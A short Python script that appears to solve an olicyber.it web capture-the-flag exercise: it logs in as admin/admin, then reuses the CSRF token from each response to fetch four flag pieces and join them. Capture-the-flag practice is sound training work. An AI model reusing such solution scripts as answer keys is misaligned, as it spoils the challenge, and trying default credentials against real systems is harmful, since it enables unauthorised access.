import requests
import json


s = requests.Session()

res = s.post("http://web-11.challs.olicyber.it/login", json = { "username": "admin", "password": "admin"})
print(res.text)
flag = ""

for i in range (4):
    c = res.json()["csrf"]
    res = s.get("http://web-11.challs.olicyber.it/flag_piece", params={ "csrf": c, "index" : i})
    flag += res.json()["flag_piece"]
    print(res.text)

print(flag)